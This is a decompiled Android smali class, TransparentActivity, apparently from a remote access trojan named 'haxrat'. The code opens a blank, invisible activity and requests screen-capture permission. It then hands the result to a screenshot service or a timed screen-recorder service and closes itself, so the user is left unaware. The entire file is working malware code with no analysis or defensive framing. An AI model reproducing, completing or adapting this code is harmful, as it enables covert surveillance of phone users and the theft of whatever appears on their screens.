.class public final Lcom/hax4us/haxrat/TransparentActivity;
.super Landroid/app/Activity;
.source "TransparentActivity.java"


# static fields
.field private static final DURATION:Ljava/lang/String; = "secs"

.field private static final REQUEST_ID:I = 0x1


# instance fields
.field protected intent2:Landroid/content/Intent;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 66
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onActivityResult(IILandroid/content/Intent;)V
    .locals 17
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(II",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 19
    move-object/from16 v0, p0

    move/from16 v1, p1

    move/from16 v2, p2

    move-object/from16 v3, p3

    move-object v8, v0

    move v9, v1

    move v10, v2

    move-object v11, v3

    invoke-super {v8, v9, v10, v11}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 20
    move-object v8, v3

    if-nez v8, :cond_3

    .line 21
    const-string v8, "TAGG"

    const-string v9, "data null"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    .line 24
    :goto_0
    move v8, v1

    const/4 v9, 0x1

    if-ne v8, v9, :cond_0

    .line 25
    const-string v8, "TAGG"

    const-string v9, "REQUESTCODE OK"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    .line 26
    :cond_0
    move v8, v2

    const/4 v9, -0x1

    if-ne v8, v9, :cond_4

    .line 27
    const-string v8, "TAGG"

    const-string v9, "RESULTOK"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    .line 30
    :goto_1
    move v8, v1

    const/4 v9, 0x1

    if-ne v8, v9, :cond_2

    move v8, v2

    const/4 v9, -0x1

    if-ne v8, v9, :cond_2

    .line 31
    move-object v8, v0

    invoke-virtual {v8}, Lcom/hax4us/haxrat/TransparentActivity;->getIntent()Landroid/content/Intent;

    move-result-object v8

    const-string v9, "FIRSTTIME"

    const/4 v10, 0x0

    invoke-virtual {v8, v9, v10}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v8

    if-nez v8, :cond_1

    .line 32
    move-object v8, v0

    invoke-virtual {v8}, Lcom/hax4us/haxrat/TransparentActivity;->getIntent()Landroid/content/Intent;

    move-result-object v8

    const-string v9, "flag"

    const/4 v10, -0x1

    invoke-virtual {v8, v9, v10}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v8

    move v5, v8

    .line 33
    move v8, v5

    const/4 v9, 0x1

    if-ne v8, v9, :cond_5

    .line 34
    const-string v8, "TAGG"

    const-string v9, "flag 1"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    .line 35
    move-object v8, v0

    new-instance v9, Landroid/content/Intent;

    move-object/from16 v16, v9

    move-object/from16 v9, v16

    move-object/from16 v10, v16

    move-object v11, v0

    :try_start_0
    const-string v12, "com.hax4us.haxrat.Screenshot"

    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v12

    invoke-direct {v10, v11, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v9, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;

    .line 42
    :goto_2
    move-object v8, v0

    iget-object v8, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;

    const-string v9, "resultCode"

    move v10, v2

    invoke-virtual {v8, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v8

    .line 43
    move-object v8, v0

    iget-object v8, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;

    const-string v9, "android.intent.extra.INTENT"

    move-object v10, v3

    invoke-virtual {v8, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object v8

    .line 44
    move-object v8, v0

    move-object v9, v0

    iget-object v9, v9, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;

    invoke-virtual {v8, v9}, Lcom/hax4us/haxrat/TransparentActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v8

    .line 50
    :cond_1
    move-object v8, v0

    invoke-super {v8}, Landroid/app/Activity;->onBackPressed()V

    :cond_2
    return-void

    .line 23
    :cond_3
    const-string v8, "TAGG"

    const-string v9, "data is not null"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    goto/16 :goto_0

    .line 29
    :cond_4
    const-string v8, "TAGG"

    const-string v9, "RESULT NOT OK"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    goto :goto_1

    .line 35
    :catch_0
    move-exception v8

    move-object v6, v8

    new-instance v8, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v16, v8

    move-object/from16 v8, v16

    move-object/from16 v9, v16

    move-object v10, v6

    invoke-virtual {v10}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v8

    .line 38
    :cond_5
    const-string v8, "TAGG"

    const-string v9, "flag 2"

    invoke-static {v8, v9}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    .line 39
    move-object v8, v0

    new-instance v9, Landroid/content/Intent;

    move-object/from16 v16, v9

    move-object/from16 v9, v16

    move-object/from16 v10, v16

    move-object v11, v0

    :try_start_1
    const-string v12, "com.hax4us.haxrat.ScreenRecorderService"

    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v12

    invoke-direct {v10, v11, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v9, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;

    .line 40
    move-object v8, v0

    iget-object v8, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;

    const-string v9, "secs"

    move-object v10, v0

    invoke-virtual {v10}, Lcom/hax4us/haxrat/TransparentActivity;->getIntent()Landroid/content/Intent;

    move-result-object v10

    const-string v11, "secs"

    const/4 v12, 0x0

    invoke-virtual {v10, v11, v12}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v10

    invoke-virtual {v8, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v8

    goto :goto_2

    .line 39
    :catch_1
    move-exception v8

    move-object v6, v8

    new-instance v8, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v16, v8

    move-object/from16 v8, v16

    move-object/from16 v9, v16

    move-object v10, v6

    invoke-virtual {v10}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v8
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v1, p1

    move-object v6, v0

    const-string v7, "com.aide.ui"

    invoke-static {v6, v7}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 56
    move-object v6, v0

    move-object v7, v1

    invoke-super {v6, v7}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 57
    new-instance v6, Landroid/widget/TextView;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    move-object v8, v0

    invoke-direct {v7, v8}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    move-object v3, v6

    .line 58
    move-object v6, v3

    const-string v7, ""

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 59
    move-object v6, v0

    move-object v7, v3

    invoke-virtual {v6, v7}, Lcom/hax4us/haxrat/TransparentActivity;->setContentView(Landroid/view/View;)V

    .line 60
    move-object v6, v0

    const-string v7, "media_projection"

    invoke-virtual {v6, v7}, Lcom/hax4us/haxrat/TransparentActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    move-object v4, v6

    .line 61
    move-object v6, v0

    move-object v7, v4

    check-cast v7, Landroid/media/projection/MediaProjectionManager;

    invoke-virtual {v7}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object v7

    const/4 v8, 0x1

    invoke-virtual {v6, v7, v8}, Lcom/hax4us/haxrat/TransparentActivity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method
